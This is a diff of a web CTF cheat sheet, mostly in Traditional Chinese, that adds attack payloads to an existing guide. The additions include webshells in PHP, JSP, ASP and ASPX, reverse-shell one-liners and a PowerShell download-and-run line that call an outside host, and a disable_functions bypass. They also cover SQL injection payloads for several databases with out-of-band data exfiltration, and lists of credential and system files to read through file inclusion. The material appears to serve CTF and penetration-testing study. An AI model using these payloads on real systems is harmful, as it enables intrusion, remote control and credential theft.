@@ -4,8 +4,8 @@ WEB CTF CheatSheet
 Table of Contents
 =================
 
-*  [Webshell](#webshell)
-    * [Reverse Shell](#reverse-shell)
+*  [Webshell](#php-webshell)
+*  [Reverse Shell](#reverse-shell)
 *  [PHP Tag](#php-tag)
 *  [PHP Weak Type](#php-weak-type)
 *  [PHP Feature](#php-其他特性)
@@ -21,6 +21,7 @@ Table of Contents
     * [Oracle](#oracle)
     * [SQLite](#sqlite)
     * [Postgresql](#postgresql)
+    * [MS Access](#ms-access)
 *  [LFI](#lfi)
 *  [Upload](#上傳漏洞)
 *  [Serialization](#反序列化)
@@ -28,6 +29,8 @@ Table of Contents
     * [Python Pickle](#python-pickle)
     * [Ruby Marshal](#rubyrails-marshal)
     * [Ruby YAML](#rubyrails-yaml)
+    * [Java Serialization](#java-deserialization)
+    * [.NET Serialization](#net-derserialization)
 *  [SSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [AngularJS](#angularjs)
@@ -42,7 +45,12 @@ Table of Contents
     * [Finger Print](#fingerprint)
 *  [XXE](#xxe)
     * [Out of Band XXE](#out-of-band-oob-xxe)
-*  [XSS](#xss)
+    * [Error-based XXE](#error-based-xxe)
+*  [Frontend](#frontend)
+    * [XSS](#xss)
+    * [RPO](#rpo)
+    * [CSS Injection](#css-injection)
+    * [XS-Leaks](#xs-leaks)
 *  [Crypto](#密碼學)
     * [PRNG](#prng)
     * [ECB mode](#ecb-mode)
@@ -56,11 +64,15 @@ Table of Contents
 
 
 # Webshell
+
+## PHP Webshell
+
 ```php
 <?php system($_GET["cmd"]); ?>
 <?php system($_GET[1]); ?>
 <?php system("`$_GET[1]`"); ?>
 <?= system($_GET[cmd]);
+<?=`$_GET[1]`;
 <?php eval($_POST[cmd]);?>
 <?php echo `$_GET[1]`;
 <?php echo passthru($_GET['cmd']);
@@ -128,7 +140,7 @@ A=fl;B=ag;cat $A$B
 
 ```
 
-## webshell駐留記憶體
+### webshell駐留記憶體
 
 解法：restart
 ```php
@@ -147,7 +159,7 @@ A=fl;B=ag;cat $A$B
 
 ```
 
-## 無文件webshell
+### 無文件webshell
 
 解法：restart
 ```php
@@ -165,7 +177,61 @@ A=fl;B=ag;cat $A$B
 ```
 
 
-## Reverse Shell
+## JSP Webshell
+
+- 無回顯:
+
+```
+<%Runtime.getRuntime().exec(request.getParameter("i"));%>
+```
+
+- 有回顯:
+
+```
+<%
+if("kaibro".equals(request.getParameter("pwd"))) {
+    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print("</pre>");
+}
+%>
+```
+
+
+## ASP Webshell
+
+```
+<%eval request("kaibro")%>
+
+<%execute request("kaibro")%>
+
+<%ExecuteGlobal request("kaibro")%>
+
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+
+```
+
+## ASPX Webshell
+
+- 一般:
+
+```
+<%@ Page Language="Jscript"%><%eval(Request.Item["kaibro"],"unsafe");%>
+```
+
+- 上傳:
+
+```
+<%if (Request.Files.Count!=0){Request.Files[0].SaveAs(Server.MapPath(Request["f"]));}%>
+```
+
+
+# Reverse Shell
 
 - 本機Listen Port
     - `ncat -vl 5566`
@@ -184,12 +250,24 @@ A=fl;B=ag;cat $A$B
 - NC
     - `nc -e /bin/sh kaibro.tw 5566`
 
+- Telnet
+    - `mknod backpipe p && telnet kaibro.tw 5566 0<backpipe | /bin/bash 1>backpipe`
+
 - Python
     - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+- Ruby 
+    - `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("kaibro.tw","5566");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
 
 - Node.js
     - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
     - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");`
+
+- Java
+    - `Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/kaibro.tw/5278;cat <&5 | while read line; do $line 2>&5 >&5; done"});p.waitFor();`
+
+- Powershell
+    - `powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c kaibro.tw -p 5566 -e cmd`
 
 # PHP Tag
 
@@ -520,6 +598,153 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - https://github.com/GoSecure/php7-opcache-override
     - Disassembler可以把Byte code轉成Pseudo code
 
+- Example
+    - [0CTF 2018 Qual - EzDoor](https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor)
+
+## PCRE回溯次數限制繞過
+
+- PHP的PCRE庫使用NFA作為正規表達式引擎
+    - NFA在匹配不上時，會回溯嘗試其他狀態
+- PHP為防止DOS，設定了PCRE回溯次數上限
+    - `pcre.backtrack_limit`
+    - 預設為`1000000`
+- 回溯次數超過上限時，`preg_match()`會返回`false`
+- Example
+    - Code-Breaking Puzzles - pcrewaf
+
+## open_basedir繞過
+
+- glob 列目錄
+
+```php
+$file_list = array();
+$it = new DirectoryIterator("glob:///*");
+foreach($it as $f) {  
+    $file_list[] = $f->__toString();
+}
+sort($file_list);  
+foreach($file_list as $f){  
+    echo "{$f}<br/>";
+}
+```
+
+- [phuck3](https://twitter.com/Blaklis_/status/1111586655134203904)
+
+```php
+chdir('img');
+ini_set('open_basedir','..');
+chdir('..');chdir('..');
+chdir('..');chdir('..');
+ini_set('open_basedir','/');
+echo(file_get_contents('flag'));
+```
+
+- symlinks
+
+```php
+mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
+symlink('/var/www/html/a/b/c/d/e/f/g','foo');
+ini_set('open_basedir','/var/www/html:bar/');
+symlink('foo/../../../../../../','bar');
+unlink('foo');
+symlink('/var/www/html/','foo');
+echo file_get_contents('bar/etc/passwd');
+```
+
+- Fastcgi
+    - [link](https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy)
+
+- ...
+
+## disable_functions繞過
+
+- bash shellshock
+- mail()
+    - `sendmail`
+    - putenv寫LD_PRELOAD
+    - trick: [LD_PRELOAD without sendmail/getuid()](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
+- imap_open()
+    ```php
+    <?php
+    $payload = "echo hello|tee /tmp/executed";
+    $encoded_payload = base64_encode($payload);
+    $server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
+    @imap_open('{'.$server.'}:143/imap}INBOX', '', '');
+    ```
+- error_log()
+    - 第二個參數`message_type`為1時，會去調用sendmail
+
+- ImageMagick
+    - [Command Injection](https://www.exploit-db.com/exploits/39766)
+    - LD_PRELOAD + ghostscript:
+        - Imagemagick會用ghostscript去parse `eps`
+        - [Link](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload)
+    - LD_PRELOAD + ffpmeg
+        - [Link](https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/)
+    - MAGICK_CODER_MODULE_PATH
+        - > it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory
+        - [Document](https://www.imagemagick.org/script/resources.php#Environment%20Variables)
+        - [Link](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy)
+    - MAGICK_CONFIGURE_PATH
+        - `delegates.xml`定義處理各種文件的規則
+        - 可以用putenv寫掉設定檔路徑
+        - [Link](https://xz.aliyun.com/t/4688#toc-14)
+
+        ```xml
+        <delegatemap>
+        <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/output&quot;"/>
+        </delegatemap>
+        ```
+
+    - 蓋`PATH` + ghostscript:
+        - 造一個執行檔gs
+
+        ```cpp
+        #include <stdlib.h>
+        #include <string.h>
+        int main() {
+            unsetenv("PATH");
+            const char* cmd = getenv("CMD");
+            system(cmd);
+            return 0;
+        }
+        ```
+
+        ```php
+        putenv('PATH=/tmp/mydir');
+        putenv('CMD=/readflag > /tmp/mydir/output');
+        chmod('/tmp/mydir/gs','0777');
+        $img = new Imagick('/tmp/mydir/1.ept');
+        ```
+- dl()
+    - 載入module
+    - `dl("rce.so")`
+
+- FFI
+    - PHP 7.4 feature
+    - preloading + ffi
+    - e.g. [RCTF 2019 - nextphp](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp)
+- [Extension](https://github.com/w181496/FuckFastcgi)
+- [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
+
+- [JSON UAF Bypass](https://github.com/mm0r1/exploits/tree/master/php-json-bypass)
+    - 7.1 - all versions to date
+    - 7.2 < 7.2.19 (released: 30 May 2019)
+    - 7.3 < 7.3.6 (released: 30 May 2019)
+- [GC Bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)
+    - 7.0 - all versions to date
+    - 7.1 - all versions to date
+    - 7.2 - all versions to date
+    - 7.3 - all versions to date
+
+- [Backtrace Bypass](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)
+    - 7.0 - all versions to date
+    - 7.1 - all versions to date
+    - 7.2 - all versions to date
+    - 7.3 - all versions to date
+    - 7.4 - all versions to date
+
+- 族繁不及備載......        
 
 ## 其他
 
@@ -530,6 +755,9 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - ```echo `whoami`; ```
     - `kaibro`
 - 正規表達式`.`不匹配換行字元`%0a`
+- 正規表達式常見誤用:
+    - `preg_match("/\\/", $str)`
+    - 匹配反斜線應該要用`\\\\`而不是`\\`
 - 運算優先權問題
     - `$a = true && false;`
         - `$a` => `false`
@@ -566,11 +794,20 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
         - False
     - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
         - True
+    - ```filter_var('"aaaaa{}[]()\'|!#$%*&^-_=+`,."@b.c',FILTER_VALIDATE_EMAIL) ```
+        - `"aaaaa{}[]()'|!#$%*&^-_=+`,."@b.c` (OK)
+    - `filter_var('aaa."bbb"@b.c',FILTER_VALIDATE_EMAIL)`
+        - `aaa."bbb"@b.c` (OK)
+    - `filter_var('aaa"bbb"@b.c',FILTER_VALIDATE_EMAIL)`
+        - False
 
 - json_decode
     - 不直接吃換行字元和\t字元
     - 但可以吃'\n'和'\t'
         - 會轉成換行字元和Tab
+    - 也吃`\uxxxx`形式
+        - `json_decode('{"a":"\u0041"}')`
+
 
 - === bug
     - `var_dump([0 => 0] === [0x100000000 => 0])`
@@ -579,8 +816,21 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
     - https://3v4l.org/sUEMG
 - openssl_verify
     - 預測採用SHA1來做簽名，可能有SHA1 Collision問題
-    - DEFCON CTF 2018 Qual
+    - e.g. [DEFCON CTF 2018 Qual - EasyPisy](https://github.com/w181496/CTF/tree/master/defcon2018-qual/EasyPisy)
+- Namespace
+    - PHP的預設Global space是`\`
+    - e.g. `\system('ls');`
 
+- basename (php bug 62119)
+    - `basename("index.php/config.php/喵")`
+        - `config.php`
+    - Example: [zer0pts CTF 2020 - Can you guess it?](https://github.com/w181496/CTF/tree/master/zer0pts2020/can_you_guess_it)
+
+- strip_tags (php bug 78814)
+    - php version <= 7.4.0
+    - `strip_tags("<s/trong>b</strong>", "<strong>")`
+        - `<s/trong>b</strong>`
+    - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/w181496/CTF/tree/master/zer0pts2020/MusicBlog)
 
 # Command Injection
 
@@ -669,7 +919,7 @@ pop graphic-context
 - ``` `ls` ```
 - `system("ls")`
 - `eval("ruby code")`
-    - Non-Alphanumeric example: HITCON CTF 2015 - Hard to say
+    - Non-Alphanumeric example: [HITCON CTF 2015 - Hard to say](https://github.com/w181496/CTF/tree/master/hitcon2015/hard-to-say)
         - `$$/$$` => 1
         - `'' << 97 << 98 << 99` => "abc"
         - `$:`即`$LOAD_PATH`
@@ -802,9 +1052,11 @@ pop graphic-context
         - MySQL安裝路徑
     - @@datadir
         - Location of db file
+    - @@plugin_dir
     - @@hostname
     - @@version_compile_os
         - Operating System
+    - @@version_compile_machine
     - @@innodb_version
     - MD5()
     - SHA1()
@@ -902,6 +1154,11 @@ pop graphic-context
         - `id=87 and if(length(user())>0, sleep(10), 1)=1`
         - `id=87 and if(length(user())>100, sleep(10), 1)=1`
         - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
+
+- Out of Bnad
+    - Windows only
+    - `select load_file(concat("\\\\",schema_name,".dns.kaibro.tw/a")) from information_schema.schemata`
+
 - 繞過空白檢查
     - `id=-1/**/UNION/**/SELECT/**/1,2,3`
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
@@ -1013,10 +1270,22 @@ pop graphic-context
     - 取第78~87筆
         - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
 - 其它：
+    - user
     - db_name()
     - user_name()
+    - @@version
+    - @@language
     - @@servername
     - host_name()
+    - has_dbaccess('master')
+- 查詢用戶 
+    - `select name, loginame from master..syslogins, master..sysprocesses`
+- 查用戶密碼 
+    - `select user,password from master.dbo.syslogins`
+- 當前角色是否為資料庫管理員
+    - `SELECT is_srvrolemember('sysadmin')`
+- 當前角色是否為db_owner
+    - `SELECT  IS_MEMBER('db_owner')`
 - 爆DB name
     - ```DB_NAME(N)```
     - ```UNION SELECT NULL,DB_NAME(N),NULL--```
@@ -1032,13 +1301,15 @@ pop graphic-context
     - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
     - `SELECT name FROM syscolumns WHERE id=object_id('news')`
     - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
+    - `SELECT name FROM DBNAME..syscolumns WHERE id=(SELECT id FROM DBNAME..sysobjects WHERE name='TABLENAME')`
 - Union Based
     - Column型態必須相同
     - 可用`NULL`來避免
 - Error Based
     - 利用型別轉換錯誤
     - `id=1 and user=0`
-
+- Out of Band
+    - `declare @p varchar(1024);set @p=(SELECT xxxx);exec('master..xp_dirtree "//'+@p+'.oob.kaibro.tw/a"')`
 - 判斷是否站庫分離
     - 客戶端主機名：`select host_name();`
     - 服務端主機名：`select @@servername; `
@@ -1055,6 +1326,10 @@ pop graphic-context
     EXEC sp_configure 'xp_cmdshell',1
     RECONFIGURE
     ```
+
+    - 執行 command
+        - `exec xp_cmdshell 'whoami'`
+
     - 關閉xp_cmdshell
     
     ```
@@ -1073,23 +1348,45 @@ pop graphic-context
 ## Oracle
 
 - `SELECT`語句必須包含`FROM`
-    - 用`dual`表
+    - 未指定來源，可以用`dual`表
 - 子字串：
-    - `SUBSTR("abc", 1, 1) => 'a'`
+    - `SUBSTR('abc', 1, 1) => 'a'`
 - 空白字元
     - `00 0A 0D 0C 09 20`
 - IF語句
     - `IF condition THEN true-part [ELSE false-part] END IF`
 - 註解：
     - `--`
+    - `/**/`
+- 不支援 limit
+    - 改用 rownum
+    - `select table_name from (select rownum no, table_name from all_tables) where no=1`
+- 單雙引號
+    - 單引號: string, date
+    - 雙引號: identifier (table name, column name, ...)
 - 其它
     - `SYS.DATABASE_NAME`
         - current database
     - `USER`
         - current user
+        - or `sys.login_user`
+    - `SELECT role FROM session_roles`
+        - current role
+    - `SELECT privilege FROM user_sys_privs`
+        - system privileges granted to the current user
+    - `SELECT privilege FROM role_sys_privs`
+        - privs the current role has
+    - `SELECT privilege FROM session_privs`
+        - the all privs that current user has = user_sys_privs + role_sys_privs
     - `SELECT banner FROM v$version where rownum=1`
         - database version
-- 庫名
+    - `SELECT host_name FROM v$instance;`
+        - Name of the host machine
+    - `utl_inaddr.get_host_address`
+        - 本機IP
+    - `select utl_inaddr.get_host_name('87.87.87.87') from dual`
+        - IP反解
+- 庫名(schema)
     - `SELECT DISTINCT OWNER FROM ALL_TABLES`
 - 表名
     - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
@@ -1099,11 +1396,43 @@ pop graphic-context
     - Column型態必須相同
     - 可用`NULL`來避免
     - `UNION SELECT 1, 'aa', null FROM dual`
+- Time Based
+    - `dbms_pipe.receive_message(('a'),10)`
+        - `SELECT CASE WHEN (CONDITION_HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
 - Error Based
-    - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
+    - `CTXSYS.DRITHSX.SN`
+        - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
+    - `utl_inaddr.get_host_name`
+        - `and 1=utl_inaddr.get_host_name((SQL in HERE))`
+        - 版本>=11g，需要超級用戶或授予網路權限的用戶才能用
+    - `dbms_xdb_version.checkin`
+        - `and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null`
+    - `dbms_xdb_version.makeversioned`
+        - `and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null`
+    - `dbms_xdb_version.uncheckout`
+        - `and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null`
+    - `dbms_utility.sqlid_to_sqlhash`
+        - `and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null`
 - Out of band
     - `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`
+    - `SYS.DBMS_LDAP.INIT()`
+    - `utl_inaddr.get_host_address()`
+    - `HTTPURITYPE`
+        - `SELECT HTTPURITYPE('http://30cm.club/index.php').GETCLOB() FROM DUAL;`
+    - `extractvalue()` XXE
+        - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT xxxx)||'.oob.kaibro.tw/"> %remote;]>'),'/l') FROM dual`
+        - 新版已patch
 
+- users
+    - `select username from all_users`
+        - lists all users of the database
+    - `select name, password from sys.user$`
+    - `select username,password,account_status from dba_users`
+
+- 特殊用法
+    - `DBMS_XMLGEN.getXML('select user from dual')`
+    - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
+        - Java code execution
 ## SQLite
 
 - 子字串：
@@ -1132,6 +1461,10 @@ pop graphic-context
 - 其他
     - `sqlite_version()`
     - sqlite無法使用`\'`跳脫單引號
+    - `[]` 神奇用法
+        - `CREATE TABLE a AS SELECT sql [ some shit... ]FROM sqlite_master;`
+            - CREATE TABLE 後面也能接 SELECT condition
+        - [zer0pts CTF 2020 - phpNantokaAdmin](https://github.com/w181496/CTF/tree/master/zer0pts2020/phpNantokaAdmin)
 - Boolean Based: SECCON 2017 qual SqlSRF
 
 <details>
@@ -1191,6 +1524,7 @@ end
 - Delay function
     - `pg_sleep(5)`
     - `GENERATE_SERIES(1, 1000000)`
+    - `repeat('a', 10000000)`
 - 空白字元
     - `0A 0D 0C 09 20`
 - encode / decode
@@ -1231,6 +1565,33 @@ end
     - `pg_ls_dir(dirname)`
         - 列目錄內容
         - 只能列data_directory下的
+    - PHP的`pg_query()`可以多語句執行
+    - `lo_import()`, `lo_get()`讀檔
+        - `select cast(lo_import('/var/lib/postgresql/data/secret') as text)` => `18440`
+        - `select cast(lo_get(18440) as text)` => `secret_here`
+
+## MS Access
+
+- 沒有註解
+    - 某些情況可以用`%00`, `%16`來達到類似效果
+- 沒有 Stacked Queries
+- 沒有 Limit
+    - 可以用 `TOP`, `LAST` 取代
+    - `'UNION SELECT TOP 5 xxx FROM yyy%00`
+- 沒有 Sleep, Benchmark, ...
+- 支援 Subquery
+    - `'AND (SELECT TOP 1 'xxx' FROM table)%00`
+- String Concatenation
+    - `&` (`%26`)
+    - `+` (`%2B`)
+    - `'UNION SELECT 'aa' %2b 'bb' FROM table%00`
+- Ascii Function
+    - `ASC()`
+    - `'UNION SELECT ASC('A') FROM table%00`
+- IF THEN
+    - `IFF(condition, true, false)`
+    - `'UNION SELECT IFF(1=1, 'a', 'b') FROM table%00`
+- https://insomniasec.com/cdn-assets/Access-Through-Access.pdf
 
 ## ORM injection
 
@@ -1305,29 +1666,114 @@ HQL injection example (pwn2win 2017)
 
 ### Linux / Unix
 
-- `./index.php`
-- `././index.php`
-- `.//index.php`
-- `../../../../../../etc/passwd`
-- `../../../../../../etc/passwd%00`
-    - 僅在5.3.0以下可用
-    - magic_quotes_gpc需為OFF
-- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
-- `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
-- `/var/log/apache2/error.log`
-- `/var/log/httpd/access_log`
-- `/usr/local/apache2/conf/httpd.conf`
-- `/etc/apache2/apache2.conf`
-- `/etc/apache2/sites-available/000-default.conf`
-- `/usr/local/etc/apache2/httpd.conf`
-- `/etc/nginx/conf.d/default.conf`
-- `/etc/nginx/nginx.conf`
-- `/etc/nginx/sites-enabled/default`
-- `/etc/nginx/sites-enabled/default.conf`
-- `.htaccess`
-- `/root/.bash_history`
-- `/root/.ssh/id_rsa`
-- `/root/.ssh/authorized_keys`
+- Common Payload
+    - `./index.php`
+    - `././index.php`
+    - `.//index.php`
+    - `../../../../../../etc/passwd`
+    - `../../../../../../etc/passwd%00`
+        - 僅在5.3.0以下可用
+        - magic_quotes_gpc需為OFF
+    - `....//....//....//....//etc/passwd`
+    - `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
+    - `%252e/%252e/etc/passwd`
+    - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
+    - `.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd`
+    - `static\..\..\..\..\..\..\..\..\etc\passwd`
+    
+- Config
+    - `/usr/local/apache2/conf/httpd.conf`
+    - `/usr/local/etc/apache2/httpd.conf`
+    - `/etc/apache2/sites-available/000-default.conf`
+    - `/etc/apache2/apache2.conf`
+    - `/etc/apache2/httpd.conf`
+    - `/etc/httpd/conf/httpd.conf`
+    - `/etc/nginx/conf.d/default.conf`
+    - `/etc/nginx/nginx.conf`
+    - `/etc/nginx/sites-enabled/default`
+    - `/etc/nginx/sites-enabled/default.conf`
+    - `/etc/mysql/my.cnf`
+    - `/etc/resolv.conf`
+    - `/etc/named.conf`
+    - `/etc/rsyslog.conf`
+    - `/etc/samba/smb.conf`
+    - `/etc/openldap/slapd.conf`
+    - `/etc/mongod.conf`
+    - `~/.tmux.conf`
+    - `$TOMCAT_HOME/conf/tomcat-users.xml`
+    - `$TOMCAT_HOME/conf/server.xml`
+
+- Log
+    - `/var/log/apache2/error.log`
+    - `/var/log/httpd/access_log`
+    - `/var/log/mail.log`
+    - `/var/log/auth.log`
+    - `/var/log/messages`
+    - `/var/log/secure`
+    - `/var/log/sshd.log`
+    - `/var/log/mysqld.log`
+    - `/var/log/mongodb/mongod.log`
+    - `$TOMCAT_HOME/logs/catalina.out`
+
+- History
+    - `.history`
+    - `.bash_history`
+    - `.sh_history`
+    - `.zsh_history`
+    - `.viminfo`
+    - `.php_history`
+    - `.mysql_history`
+    - `.dbshell`
+    - `.histfile`
+    - `.node_repl_history`
+    - `.python_history`
+    - `.scapy_history`
+    - `.sqlite_history`
+    - `.psql_history`
+    - `.lesshst`
+    - `.wget-hsts`
+    - `.config/fish/fish_history`
+    - `.local/share/fish/fish_history`
+    - `.ipython/profile_default/history.sqlite`
+
+- 其他
+    - `/proc/self/cmdline`
+    - `/proc/self/fd/[0-9]*`
+    - `/proc/self/environ`
+    - `/proc/net/fib_trie`
+    - `/proc/mounts`
+    - `/proc/net/arp`
+    - `/proc/net/tcp`
+    - `/proc/sched_debug`
+    - `.htaccess`
+    - `~/.bashrc`
+    - `~/.bash_profile`
+    - `~/.bash_logout`
+    - `~/.zshrc`
+    - `~/.aws/config`
+    - `~/.aws/credentials`
+    - `~/.boto`
+    - `~/.s3cfg`
+    - `~/.gitconfig`
+    - `~/.config/git/config`
+    - `~/.git-credentials`
+    - `~/.env`
+    - `/etc/passwd`
+    - `/etc/shadow`
+    - `/etc/hosts`
+    - `/etc/rc.d/rc.local`
+    - `/etc/boto.cfg`
+    - `/root/.ssh/id_rsa`
+    - `/root/.ssh/authorized_keys`
+    - `/root/.ssh/known_hosts`
+    - `/root/.ssh/config`
+    - `/etc/sysconfig/network-scripts/ifcfg-eth0`
+    - `/etc/exports`
+    - `/etc/crontab`
+    - `/var/spool/cron/root`
+    - `/var/spool/cron/crontabs/root`
+    - `/var/mail/<username>`
+
 
 ### Windows
 
@@ -1335,25 +1781,38 @@ HQL injection example (pwn2win 2017)
 - `C:/boot.ini`
 - `C:/apache/logs/access.log`
 - `../../../../../../../../../boot.ini/.......................`
-- `C:/windows/system32/drivers/etc/hosts`
+- `%WINDIR%\System32\drivers\etc\hosts`
+- `C:\WINDOWS\System32\Config\SAM`
+- `C:/WINDOWS/repair/sam`
+- `C:/WINDOWS/repair/system`
+- `%SYSTEMROOT%\System32\config\RegBack\SAM`
+- `%SYSTEMROOT%\System32\config\RegBack\system`
+- `%WINDIR%\system32\config\AppEvent.Evt`
+- `%WINDIR%\system32\config\SecEvent.Evt`
+- `%WINDIR%\iis[version].log`
+- `%WINDIR%\debug\NetSetup.log`
+- `%SYSTEMDRIVE%\autoexec.bat`
+- `C:\Documents and Settings\All Users\Application Data\Git\config`
+- `C:\ProgramData\Git\config`
+- `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
 
 ## 環境變數
 
 - `../../../../proc/self/environ`
     - HTTP_User_Agent塞php script
 
-## log文件
-
-- apache log
-- mysql log
-- ssh log
-    - `/var/log/auth.log`
-
-
 ## php://filter
 
 - `php://filter/convert.base64-encode/resource=index.php`
+- `php://filter/convert.base64-decode/resource=index.php`
 - `php://filter/read=string.rot13/resource=index.php`
+- `php://filter/zlib.deflate/resource=index.php`
+- `php://filter/zlib.inflate/resource=index.php`
+- `php://filter/convert.quoted-printable-encode/resource=index.php`
+- `php://filter/read=string.strip_tags/resource=php://input`
+- `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
+- `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`
+- ...
 
 ## php://input
 
@@ -1365,7 +1824,9 @@ HQL injection example (pwn2win 2017)
 
 - 對server以form-data上傳文件，會產生tmp檔
 - 利用phpinfo得到tmp檔路徑和名稱
-- Get shell
+- LFI Get shell
+- 限制
+    - Ubuntu 17後，預設開啟`PrivateTmp`，無法利用
 
 ## php session
 
@@ -1376,6 +1837,16 @@ HQL injection example (pwn2win 2017)
     - /tmp/
     - /var/lib/php5/
     - /var/lib/php/
+    - C:\windows\temp\sess_<PHPSESSID>
+        - windows
+- `session.upload_progress`
+    - PHP預設開啟
+    - 用來監控上傳檔案進度
+    - 當`session.upload_progress.enabled`開啟，可以POST在`$_SESSION`中添加資料 (`sess_{PHPSESSID}`)
+    - 配合LFI可以getshell
+    - `session.upload_progress.cleanup=on`時，可以透過Race condition
+    - Example
+        - [HITCON CTF 2018 - One Line PHP Challenge](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
 
 ## data://
 
@@ -1401,6 +1872,16 @@ HQL injection example (pwn2win 2017)
             $p->addFromString('b.jpg', $x);
         ?>
     - 構造 `?file=phar://phartest.zip/b.jpg`
+
+## SSI (Server Side Includes)
+
+- 通常放在`.shtml`, `.shtm`
+- Execute Command
+    - `<!--#exec cmd="command"-->`
+- File Include
+    - `<!--#include file="../../web.config"-->`
+- Example
+    - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
 
 # 上傳漏洞
 
@@ -1557,6 +2038,17 @@ HQL injection example (pwn2win 2017)
     - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
     - 兩者結果相同
 
+- Phar:// 反序列化
+    - phar文件會將使用者自定義的metadata以序列化形式保存
+    - 透過`phar://`偽協議可以達到反序列化的效果
+    - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
+    - Generic Gadget Chains
+        - [phpggc](https://github.com/ambionics/phpggc)
+    - Example
+        - [HITCON CTF 2017 - Baby^H Master](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
+        - [HITCON CTF 2018 - Baby Cake PHP 2017](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
+        - [DCTF 2018 - Vulture](https://cyku.tw/ctf-defcamp-qualification-2018/)
+
 ## Python Pickle
 
 - `dumps()` 將物件序列化成字串
@@ -1657,8 +2149,57 @@ print marshalled
 
 ## Java Deserialization
 
-- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+- 序列化資料特徵
+    - `ac ed 00 05 ...`
+    - `rO0AB ...` (Base64)
+- 反序列化觸發點
+    - `readObject()`
+    - `readExternal()`
+    - ...
+- JEP290
+    - Java 9 新特性，並向下支援到 8u121, 7u13, 6u141
+    - 增加黑、白名單機制
+    - Builtin Filter
+        - JDK 包含了 Builtin Filter (白名單機制) 在 RMI Registry 和 RMI Distributed Garbage Collector
